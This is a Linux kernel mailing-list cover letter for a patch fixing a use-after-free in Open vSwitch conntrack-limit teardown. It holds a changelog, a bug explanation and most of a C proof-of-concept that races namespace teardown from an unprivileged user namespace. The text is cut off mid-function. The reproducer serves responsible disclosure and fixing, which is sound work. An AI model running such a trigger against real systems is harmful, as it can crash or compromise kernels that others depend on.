Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E6225367285
	for <netdev@vger.kernel.org>; Fri, 21 Aug 2026 03:19:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787282401; cv=none; b=b2LrjTwfpGmgcIklu8yAxzcvRdnTAA+pa4ff5IetMqJY0EOfG0gO+ltfcTrzf9XhSx0/lI+U4r0k3efx2XUKhL4F9TusULcoWneIGmg9arLFbdPEirz6Bh855RW7Njp+xBeQtCBbAUdbcy31HYMWuko2uyXsA18ZL4llZkg53LY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787282401; c=relaxed/simple;
	bh=6o6+LKtBfILy9PotwV6GlYAojzKQCIZOIrpLb9nmCa4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=VAj+mhrZWzvTiYFkP5D1F37u4zotX1iLxGIAu6i/qSNKPb7MgBJroBU/6Mxn4dZ9/gBjyGvBY4whp8EdqXYr9uehaPBfGjgKj6XEyKrAP1eK1oc6Htmz+aG8gOg5KCQcQgZE4/ffD6tkTEY8p8oOMUl0pQ6qOelEkMJPUZCkTME=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZwMY0Kl/; arc=none smtp.client-ip=209.85.214.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ZwMY0Kl/"
Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2ceb096e675so6903825ad.0
        for <netdev@vger.kernel.org>; Thu, 20 Aug 2026 20:19:54 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1787282393; x=1787887193; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=puHfL3MDXy6NKBD+8NPxYipRGU+Dbbo3RLnHOyrANyM=;
        b=ZwMY0Kl/6v9yiHYUkkmNhK3bUzvofc6yod5nWBBh+usgauIa7QEzfpunPVRcoIHEYl
         uOdFrx07hniSeMc/y6C97IHRJhqFGUCnM2JMkxUsZYQpGxJ7w9oSUMG5eBhMR/a+cLjs
         deh+5AnJ9IZRLPGolcRdW+P2FGo4hlB4JTe0Gbw8/55TEqtsqcMZBYiHpa1EHmD9MbD/
         Q1b4p293c9B0SB4TY5opNU791T/Z9AJutm3YJ+y7LYUQ9ZnKQ3OhJcKfnoIqRdpXYk44
         nrVJ1RqrZlj5Qm8j8NzHa2CKiPLMn9ibttDUDhzp8Qk1VwJl+XMv87KT4UvscNTicrWi
         diZQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787282393; x=1787887193;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=puHfL3MDXy6NKBD+8NPxYipRGU+Dbbo3RLnHOyrANyM=;
        b=Kp4FAqgjChonWikG38nvZdM/1m5bGzPNs1PLeoAx5OF82XqiwV3Kxs20bu3hNlAzhe
         tQN/oA/GTVIk3eyjt8uZX41CossxNyqR/kzjNtcjE8BnrK5jOXsd5WxlxcIvti8QxAK9
         /eoYVijIOLneiXj81FuawB2OqEOq5r6foadgf1l2q13AjCbQUwfSRM5U08/DZqmydKB5
         OTJKKgyfqXNAfNlS84bgPqX5U9tFctE1na0GtxMrP37pKhRS7wi+HvCLJuTR/CY5H32O
         mho5DIk7pGvRENX5Y3wVgjxl4LUqdOgRMtelsVGfnhTvCbCSMFRey6K0tKmipNpurHO9
         KesQ==
X-Forwarded-Encrypted: i=1; AHgh+RoJUV+7bmmrXAW/pB/WWXMlx/toxzICm+5ux9xEykKYITUHZ9r6nWEfPIa814FuBZBYWmo0ou0=@vger.kernel.org
X-Gm-Message-State: AFuF++kjw6d7hlXE3iKP4adUM3KHBozl+B5yNgGSW3XpjOmdxAhlwL69
	vIRTW2W9RIZC75IvDYmjjybQ6Jf642zORGy52K9+6Ako2xb0aF/73c/V
X-Gm-Gg: AR+sD13ExVBLtesCUBiDMOZWiQPD97nlTVnJywfF5gdPyCoDEhHXHFepmX1QdWhk9nR
	3qglNWjyfO4Rrf8rOCYZlRYATdYd5uhcnWYikHCngr+r/B1QsEY3vr+oobKhqcBIDRu+xpzbFIl
	UW+UFfzninDt5SS+d7Adz2IaSnBOUjb5/QviQfhyIedD5I9Wd1fridIK5NYJ48Mf0NX3moR2j4i
	rUm2NiBrHA3/aTiH5ZQZ6Gk9+WhQi9EfRH7HoWSQ2ptqP0H8RRBSEQhcXB2DytiInnfGC3KmMf1
	/IYFOGfUkf19zRIDqmVQOjuyKALh4UThOlzmiu6TxBaIVoUqwhPmpBmoyZUGH+JOa9X/5dj9mcr
	G0EGwuqtbpTBs8dTCPmYqVCfZelTSUeJiWdTQSFvj/yto2AXSVCXdlsj733y51EwHrFMiR8EnME
	FDfRr4U7iLc20csj+6lOAW1Cx7UYEaeFKIEeYbVcR1P8+4zd2M7pAp6uF9lHD4JQqh9nxYaGr8l
	TThCAvP4oMjYJSUm98UWz+ArTwo/hOIcEis7moK5dSquHlZIAc=
X-Received: by 2002:a17:90a:c2cc:b0:38d:b36e:9813 with SMTP id 98e67ed59e1d1-395c35d91fbmr6116658a91.11.1787282392961;
        Thu, 20 Aug 2026 20:19:52 -0700 (PDT)
Received: from WR5220G5-Peking-BMC.labs.lenovo.com ([103.30.235.247])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-395c4570e63sm1299091a91.4.2026.08.20.20.19.43
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 20 Aug 2026 20:19:52 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: Aaron Conole <aconole@redhat.com>,
	Eelco Chaudron <echaudro@redhat.com>,
	Ilya Maximets <i.maximets@ovn.org>,
	Pravin B Shelar <pshelar@ovn.org>,
	Jakub Kicinski <kuba@kernel.org>
Cc: "David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Yi-Hung Wei <yihung.wei@gmail.com>,
	netdev@vger.kernel.org,
	dev@openvswitch.org,
	linux-kernel@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Nan Li <tonanli66@gmail.com>,
	Ren Wei <enjou1224z@gmail.com>
Subject: [PATCH net v9 0/1] openvswitch: Fix CT limit teardown use-after-free
Date: Fri, 21 Aug 2026 11:19:37 +0800
Message-ID: <cover.1787280296.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.54.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit



Changes in v9:

- Rebase onto net/main.
- Drop the data parameter from ovs_ct_exit_finish() and read the detached
  state from ovs_net directly, fixing the build with
  CONFIG_NETFILTER_CONNCOUNT disabled.
- Rename ct_exit_data to ct_limit_exit_data and stop moving declarations
  around in ovs_exit_net().
- v8 Link: https://lore.kernel.org/all/cover.1787129643.git.xuyuqiabc@gmail.com/
Changes in v8:

- Rebase onto net/main, which now contains the adjacent nf_connlabels
  leak fix.
- Move the CT limit detach to the pernet .pre_exit callback and complete
  the teardown in .exit, relying on the RCU grace period that the pernet
  core guarantees between the two. Drop the extra synchronize_rcu() and
  use plain kfree() in the teardown path.
- v7 Link: https://lore.kernel.org/all/cover.1786936669.git.xuyuqiabc@gmail.com/
Changes in v7:

- Split CT limit teardown into a start/finish pair so that the RCU grace
  period wait happens after ovs_mutex is released, keeping the lock from
  blocking other ovs_mutex users during the wait.
- v6 Link: https://lore.kernel.org/all/cover.1786506548.git.xuyuqiabc@gmail.com/
Changes in v6:

- Explain why netlink command handlers do not need NULL checks.
- Document that teardown currently waits for the RCU grace period while
  holding ovs_mutex, leaving lock-scope optimization for a separate change.
- v5 Link: https://lore.kernel.org/all/cover.1786441097.git.xuyuqiabc@gmail.com/

Changes in v5:

- Remove unreachable command-path NULL handling because netlink sockets
  keep their network namespaces alive while requests are processed.
- Restore the previous SET, DEL, and GET command semantics.
- Document the ct_limit_info RCU and ovs_mutex locking contract.
- v4 Link: https://lore.kernel.org/all/cover.1785908366.git.xuyuqiabc@gmail.com/

Changes in v4:

- Restore per-entry ovs_mutex locking for CT limit SET and DEL.
- Treat CT limit updates racing with netns teardown as successful no-ops.
- Free an uninstalled CT limit allocation and document GET helpers' RCU contract.
- v3 Link: https://lore.kernel.org/all/cover.1784866791.git.xuyuqiabc@gmail.com/

Changes in v3:

- Use RCU dereference and a NULL check for CT limit GET requests.
- Limit ovs_mutex to CT limit updates; do not hold it while preparing replies.
- Use ovsl_dereference() for update paths and clarify the RCU grace-period comment.
- v2 Link: https://lore.kernel.org/all/cover.1784711445.git.xuyuqiabc@gmail.com

Changes in v2:

- Sort local declarations modified by this patch in reverse
  Christmas-tree order.
- v1 Link: https://lore.kernel.org/all/aa8a1d8dcbac8a13dbdf077a642a66f4c5d81e4b.1784355642.git.xuyuqiabc@gmail.com/

Hi Linux kernel maintainers,

We found an issue in net/openvswitch/conntrack.c.
The bug is reachable by an unprivileged user using private user and network namespaces.
The relevant details are provided below.

---- details below ----

Bug details:

Packet processing uses CT limit state under RCU, while netns teardown
frees that state under ovs_mutex. The CT limit pointer was neither removed
from readers nor protected by a grace period, allowing packet processing to
dereference the freed state.

Replace the pointer before freeing the CT limit state and wait for RCU
readers before freeing its contents. Serialize individual CT limit updates
with teardown, while GET and datapath accesses use RCU-protected lookups.

Fixes: 11efd5cb04a1 ("openvswitch: Support conntrack zone limit")

Reproducer:

gcc -O2 -g -Wall -Wextra -pthread -o mini_poc mini_poc.c
./mini_poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define MAX_MSG 8192
#define DP_NAME "ovsmini"
#define PORT_NAME "povsmini"
#define PORT_NO 1
#define ZONE 1
#define LIMIT 1
#define WARMUP_MS 5
#define FLOOD_MS 500
#define CT_CLONES 4

#define OVS_DATAPATH_FAMILY "ovs_datapath"
#define OVS_DATAPATH_VERSION 2
#define OVS_VPORT_FAMILY "ovs_vport"
#define OVS_VPORT_VERSION 1
#define OVS_FLOW_FAMILY "ovs_flow"
#define OVS_FLOW_VERSION 1
#define OVS_CT_LIMIT_FAMILY "ovs_ct_limit"
#define OVS_CT_LIMIT_VERSION 1

struct ovs_header {
	int dp_ifindex;
};

enum {
	OVS_DP_CMD_NEW = 1,
	OVS_DP_CMD_GET = 3,
};

enum {
	OVS_DP_ATTR_NAME = 1,
	OVS_DP_ATTR_UPCALL_PID = 2,
	OVS_DP_ATTR_IFINDEX = 9,
};

enum {
	OVS_VPORT_CMD_NEW = 1,
};

enum {
	OVS_VPORT_ATTR_PORT_NO = 1,
	OVS_VPORT_ATTR_TYPE = 2,
	OVS_VPORT_ATTR_NAME = 3,
	OVS_VPORT_ATTR_UPCALL_PID = 5,
};

enum {
	OVS_VPORT_TYPE_INTERNAL = 2,
};

enum {
	OVS_FLOW_CMD_NEW = 1,
};

enum {
	OVS_FLOW_ATTR_KEY = 1,
	OVS_FLOW_ATTR_ACTIONS = 2,
	OVS_FLOW_ATTR_MASK = 7,
};

enum {
	OVS_KEY_ATTR_IN_PORT = 3,
	OVS_KEY_ATTR_ETHERNET = 4,
	OVS_KEY_ATTR_ETHERTYPE = 6,
	OVS_KEY_ATTR_IPV4 = 7,
	OVS_KEY_ATTR_UDP = 10,
};

enum {
	OVS_CT_ATTR_COMMIT = 1,
	OVS_CT_ATTR_ZONE = 2,
};

enum {
	OVS_ACTION_ATTR_CT = 12,
	OVS_ACTION_ATTR_CLONE = 20,
	OVS_ACTION_ATTR_DROP = 24,
};

enum {
	OVS_CT_LIMIT_CMD_SET = 1,
};

enum {
	OVS_CT_LIMIT_ATTR_ZONE_LIMIT = 1,
};

struct ovs_key_ethernet {
	uint8_t eth_src[ETH_ALEN];
	uint8_t eth_dst[ETH_ALEN];
};

struct ovs_key_ipv4 {
	uint32_t ipv4_src;
	uint32_t ipv4_dst;
	uint8_t ipv4_proto;
	uint8_t ipv4_tos;
	uint8_t ipv4_ttl;
	uint8_t ipv4_frag;
};

struct ovs_key_udp {
	uint16_t udp_src;
	uint16_t udp_dst;
};

struct ovs_zone_limit {
	int32_t zone_id;
	uint32_t limit;
	uint32_t count;
};

#ifndef NLA_ALIGN
#define NLA_ALIGNTO 4
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#ifndef NLA_DATA
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#endif

#define DIE(...) do { fprintf(stderr, __VA_ARGS__); fputc('\n', stderr); \
		      exit(EXIT_FAILURE); } while (0)

static void die_errno(const char *what)
{
	DIE("%s: %s", what, strerror(errno));
}

static void write_map(const char *path, const char *fmt, unsigned int id)
{
	char buf[64];
	int fd;
	int len;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		die_errno(path);
	len = snprintf(buf, sizeof(buf), fmt, id);
	if (write(fd, buf, (size_t)len) != len)
		die_errno(path);
	close(fd);
}

static void enter_user_netns(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();
	int fd;

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET))
		die_errno("unshare user/net namespace");

	fd = open("/proc/self/setgroups", O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		if (write(fd, "deny", 4) != 4)
			die_errno("setgroups");
		close(fd);
	}
	write_map("/proc/self/uid_map", "0 %u 1\n", uid);
	write_map("/proc/self/gid_map", "0 %u 1\n", gid);

	if (setresgid(0, 0, 0) || setresuid(0, 0, 0))
		die_errno("setresuid/setresgid");
}

static void addattr(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		    const void *data, size_t len)
{
	struct nlattr *nla;
	size_t total = NLA_ALIGN(NLA_HDRLEN + len);

	if (NLMSG_ALIGN(nlh->nlmsg_len) + total > maxlen)
		DIE("netlink message too large");
	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	if (len)
		memcpy(NLA_DATA(nla), data, len);
	if (total > nla->nla_len)
		memset((char *)nla + nla->nla_len, 0, total - nla->nla_len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + total;
}

static void add_u16(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		    uint16_t value)
{
	addattr(nlh, maxlen, type, &value, sizeof(value));
}

static void add_u32(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		    uint32_t value)
{
	addattr(nlh, maxlen, type, &value, sizeof(value));
}

static void add_s32(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		    int32_t value)
{
	addattr(nlh, maxlen, type, &value, sizeof(value));
}

static struct nlattr *nest_start(struct nlmsghdr *nlh, size_t maxlen,
				 uint16_t type)
{
	struct nlattr *start = (struct nlattr *)((char *)nlh +
						  NLMSG_ALIGN(nlh->nlmsg_len));

	addattr(nlh, maxlen, type, NULL, 0);
	return start;
}

static void nest_end(struct nlmsghdr *nlh, struct nlattr *start)
{
	start->nla_len = (uint16_t)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) -
				    (char *)start);
}

static int nl_open(int protocol)
{
	struct sockaddr_nl addr = {.nl_family = AF_NETLINK};
	int fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, protocol);

	if (fd < 0)
		die_errno("socket netlink");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)))
		die_errno("bind netlink");
	return fd;
}

static uint32_t next_seq(void)
{
	static uint32_t seq = 1;

	return __atomic_fetch_add(&seq, 1, __ATOMIC_RELAXED);
}

static void nl_send(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl addr = {.nl_family = AF_NETLINK};
	struct iovec iov = {.iov_base = nlh, .iov_len = nlh->nlmsg_len};
	struct msghdr msg = {
		.msg_name = &addr,
		.msg_namelen = sizeof(addr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};

	if (sendmsg(fd, &msg, 0) < 0)
		die_errno("sendmsg netlink");
}

static ssize_t nl_reply(int fd, uint32_t seq, char *buf, size_t len)
{
	for (;;) {
		struct nlmsghdr *nlh;
		ssize_t got = recv(fd, buf, len, 0);
		ssize_t rem;

		if (got < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		rem = got;
		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, rem);
		     nlh = NLMSG_NEXT(nlh, rem)) {
			if (nlh->nlmsg_seq != seq)
				continue;
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(nlh);

				if (err->error) {
					errno = -err->error;
					return -1;
				}
				return nlh->nlmsg_len;
			} else {
				return nlh->nlmsg_len;
			}
		}
	}
}

static void nl_ack(int fd, uint32_t seq)
{
	char buf[MAX_MSG];

	if (nl_reply(fd, seq, buf, sizeof(buf)) < 0)
		die_errno("netlink request");
}

static struct nlattr *find_attr(void *data, size_t len, uint16_t type)
{
	struct nlattr *nla;

	while (len >= sizeof(*nla)) {
		nla = data;
		if (nla->nla_len < NLA_HDRLEN || nla->nla_len > len)
			break;
		if ((nla->nla_type & NLA_TYPE_MASK) == type)
			return nla;
		len -= NLA_ALIGN(nla->nla_len);
		data = (char *)data + NLA_ALIGN(nla->nla_len);
	}
	return NULL;
}

static int family_id(int fd, const char *name)
{
	char buf[MAX_MSG] = {};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *genl;
	struct nlattr *attr;
	uint32_t seq = next_seq();

	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = seq;
	genl = NLMSG_DATA(nlh);
	genl->cmd = CTRL_CMD_GETFAMILY;
	genl->version = 1;
	addattr(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);
	nl_send(fd, nlh);
	if (nl_reply(fd, seq, buf, sizeof(buf)) < 0)
		die_errno("get generic-netlink family");
	attr = find_attr((char *)genl + GENL_HDRLEN,
			 nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN),
			 CTRL_ATTR_FAMILY_ID);
	if (!attr)
		DIE("family %s has no id", name);
	return *(uint16_t *)NLA_DATA(attr);
}

static void ovs_header(struct nlmsghdr *nlh, size_t maxlen, uint16_t family,
		       uint8_t cmd, uint8_t version, int dp_ifindex)
{
	struct genlmsghdr *genl;
	struct ovs_header *ovs;

	memset(nlh, 0, maxlen);
	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN + sizeof(*ovs));
	nlh->nlmsg_type = family;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = next_seq();
	genl = NLMSG_DATA(nlh);
	genl->cmd = cmd;
	genl->version = version;
	ovs = (struct ovs_header *)((char *)genl + GENL_HDRLEN);
	ovs->dp_ifindex = dp_ifindex;
}

static uint32_t request_seq(struct nlmsghdr *nlh)
{
	return nlh->nlmsg_seq;
}

static void set_up(int fd, const char *ifname)
{
	char buf[MAX_MSG] = {};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;
	uint32_t seq = next_seq();

	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq;
	ifi = NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_change = IFF_UP;
	ifi->ifi_flags = IFF_UP;
	addattr(nlh, sizeof(buf), IFLA_IFNAME, ifname, strlen(ifname) + 1);
	nl_send(fd, nlh);
	nl_ack(fd, seq);
}

static void move_to_ns(int fd, const char *ifname, int netns_fd)
{
	char buf[MAX_MSG] = {};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;
	unsigned int ifindex = if_nametoindex(ifname);
	uint32_t seq = next_seq();

	if (!ifindex)
		die_errno("if_nametoindex");
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq;
	ifi = NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index = (int)ifindex;
	add_s32(nlh, sizeof(buf), IFLA_NET_NS_FD, netns_fd);
	nl_send(fd, nlh);
	nl_ack(fd, seq);
}

static void create_dp(int fd, int family)
{
	char buf[MAX_MSG];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;

	ovs_header(nlh, sizeof(buf), family, OVS_DP_CMD_NEW,
		   OVS_DATAPATH_VERSION, 0);
	addattr(nlh, sizeof(buf), OVS_DP_ATTR_NAME, DP_NAME,
		sizeof(DP_NAME));
	add_u32(nlh, sizeof(buf), OVS_DP_ATTR_UPCALL_PID, 0);
	nl_send(fd, nlh);
	nl_ack(fd, request_seq(nlh));
}

static int dp_ifindex(int fd, int family)
{
	char buf[MAX_MSG] = {};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *genl;
	struct ovs_header *ovs;

	ovs_header(nlh, sizeof(buf), family, OVS_DP_CMD_GET,
		   OVS_DATAPATH_VERSION, 0);
	nlh->nlmsg_flags = NLM_F_REQUEST;
	addattr(nlh, sizeof(buf), OVS_DP_ATTR_NAME, DP_NAME,
		sizeof(DP_NAME));
	nl_send(fd, nlh);
	if (nl_reply(fd, request_seq(nlh), buf, sizeof(buf)) < 0)
		die_errno("get datapath");
	nlh = (struct nlmsghdr *)buf;
	genl = NLMSG_DATA(nlh);
	ovs = (struct ovs_header *)((char *)genl + GENL_HDRLEN);
	return ovs->dp_ifindex;
}

static void create_internal_port(int fd, int family, int dp)
{
	char buf[MAX_MSG];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;

	ovs_header(nlh, sizeof(buf), family, OVS_VPORT_CMD_NEW,
		   OVS_VPORT_VERSION, dp);
	add_u32(nlh, sizeof(buf), OVS_VPORT_ATTR_TYPE,
		OVS_VPORT_TYPE_INTERNAL);
	addattr(nlh, sizeof(buf), OVS_VPORT_ATTR_NAME, PORT_NAME,
		sizeof(PORT_NAME));
	add_u32(nlh, sizeof(buf), OVS_VPORT_ATTR_UPCALL_PID, 0);
	nl_send(fd, nlh);
	nl_ack(fd, request_seq(nlh));
}

static void set_limit(int fd, int family)
{
	char buf[MAX_MSG];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ovs_zone_limit limit = {
		.zone_id = ZONE,
		.limit = LIMIT,
	};

	ovs_header(nlh, sizeof(buf), family, OVS_CT_LIMIT_CMD_SET,
		   OVS_CT_LIMIT_VERSION, 0);
	addattr(nlh, sizeof(buf), OVS_CT_LIMIT_ATTR_ZONE_LIMIT,
		&limit, sizeof(limit));
	nl_send(fd, nlh);
	nl_ack(fd, request_seq(nlh));
}

static void add_flow(int fd, int family, int dp)
{
	char buf[MAX_MSG];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ovs_key_ethernet eth = {};
	struct ovs_key_ipv4 ip = {.ipv4_proto = 17};
	struct ovs_key_ipv4 ip_mask = {.ipv4_proto = 0xff};
	struct ovs_key_udp udp = {};
	struct nlattr *key, *mask, *actions, *ct;

	ovs_header(nlh, sizeof(buf), family, OVS_FLOW_CMD_NEW,
		   OVS_FLOW_VERSION, dp);
	key = nest_start(nlh, sizeof(buf), OVS_FLOW_ATTR_KEY);
	add_u32(nlh, sizeof(buf), OVS_KEY_ATTR_IN_PORT, PORT_NO);
	addattr(nlh, sizeof(buf), OVS_KEY_ATTR_ETHERNET, &eth, sizeof(eth));
	add_u16(nlh, sizeof(buf), OVS_KEY_ATTR_ETHERTYPE, htons(ETH_P_IP));
	addattr(nlh, sizeof(buf), OVS_KEY_ATTR_IPV4, &ip, sizeof(ip));
	addattr(nlh, sizeof(buf), OVS_KEY_ATTR_UDP, &udp, sizeof(udp));
	nest_end(nlh, key);

	mask = nest_start(nlh, sizeof(buf), OVS_FLOW_ATTR_MASK);
	add_u32(nlh, sizeof(buf), OVS_KEY_ATTR_IN_PORT, UINT32_MAX);
	addattr(nlh, sizeof(buf), OVS_KEY_ATTR_ETHERNET, &eth, sizeof(eth));
	add_u16(nlh, sizeof(buf), OVS_KEY_ATTR_ETHERTYPE, htons(UINT16_MAX));
	addattr(nlh, sizeof(buf), OVS_KEY_ATTR_IPV4, &ip_mask, sizeof(ip_mask));
	addattr(nlh, sizeof(buf), OVS_KEY_ATTR_UDP, &udp, sizeof(udp));
	nest_end(nlh, mask);

	int i;

	actions = nest_start(nlh, sizeof(buf), OVS_FLOW_ATTR_ACTIONS);
	for (i = 0; i < CT_CLONES; i++) {
		struct nlattr *clone = nest_start(nlh, sizeof(buf),
						  OVS_ACTION_ATTR_CLONE);

		ct = nest_start(nlh, sizeof(buf), OVS_ACTION_ATTR_CT);
		addattr(nlh, sizeof(buf), OVS_CT_ATTR_COMMIT, NULL, 0);
		add_u16(nlh, sizeof(buf), OVS_CT_ATTR_ZONE, ZONE);
		nest_end(nlh, ct);
		add_u32(nlh, sizeof(buf), OVS_ACTION_ATTR_DROP, 0);
		nest_end(nlh, clone);
	}
	ct = nest_start(nlh, sizeof(buf), OVS_ACTION_ATTR_CT);
	addattr(nlh, sizeof(buf), OVS_CT_ATTR_COMMIT, NULL, 0);
	add_u16(nlh, sizeof(buf), OVS_CT_ATTR_ZONE, ZONE);
	nest_end(nlh, ct);
	add_u32(nlh, sizeof(buf), OVS_ACTION_ATTR_DROP, 0);
	nest_end(nlh, actions);
	nl_send(fd, nlh);
	nl_ack(fd, request_seq(nlh));
}

static void setup_victim(int anchor_fd, int ready_fd, int go_fd)
{
	int genl, rtnl;
	int dp_family, vport_family, flow_family, limit_family;
	int dp;
	char ready = 1;

	if (unshare(CLONE_NEWNET))
		die_errno("unshare victim netns");
	genl = nl_open(NETLINK_GENERIC);
	rtnl = nl_open(NETLINK_ROUTE);
	dp_family = family_id(genl, OVS_DATAPATH_FAMILY);
	vport_family = family_id(genl, OVS_VPORT_FAMILY);
	flow_family = family_id(genl, OVS_FLOW_FAMILY);
	limit_family = family_id(genl, OVS_CT_LIMIT_FAMILY);
	create_dp(genl, dp_family);
	dp = dp_ifindex(genl, dp_family);
	create_internal_port(genl, vport_family, dp);
	set_limit(genl, limit_family);
	add_flow(genl, flow_family, dp);
	move_to_ns(rtnl, PORT_NAME, anchor_fd);
	if (write(ready_fd, &ready, 1) != 1)
		die_errno("ready pipe");
	if (read(go_fd, &ready, 1) != 1)
		_exit(EXIT_FAILURE);
	_exit(EXIT_SUCCESS);
}

static uint16_t checksum(const void *data, size_t len)
{
	const uint16_t *p = data;
	uint32_t sum = 0;

	while (len > 1) {
		sum += *p++;
		len -= 2;
	}
	if (len)
		sum += *(const uint8_t *)p;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (uint16_t)~sum;
}

struct flood_ctx {
	volatile int *stop;
	int id;
};

static void *flood_thread(void *arg)
{
	struct flood_ctx *ctx = arg;
	struct {
		uint8_t dst[ETH_ALEN];
		uint8_t src[ETH_ALEN];
		uint16_t proto;
		uint8_t ip[20];
		uint8_t udp[8];
		uint8_t payload[8];
	} __attribute__((packed)) frame = {};
	struct sockaddr_ll addr = {
		.sll_family = AF_PACKET,
		.sll_protocol = htons(ETH_P_ALL),
	};
	int fd;
	unsigned int packet_id = (unsigned int)ctx->id << 24;

	memset(frame.dst, 0x11, ETH_ALEN);
	memset(frame.src, 0x22, ETH_ALEN);
	frame.proto = htons(ETH_P_IP);
	frame.ip[0] = 0x45;
	frame.ip[8] = 64;
	frame.ip[9] = 17;
	frame.ip[12] = 10;
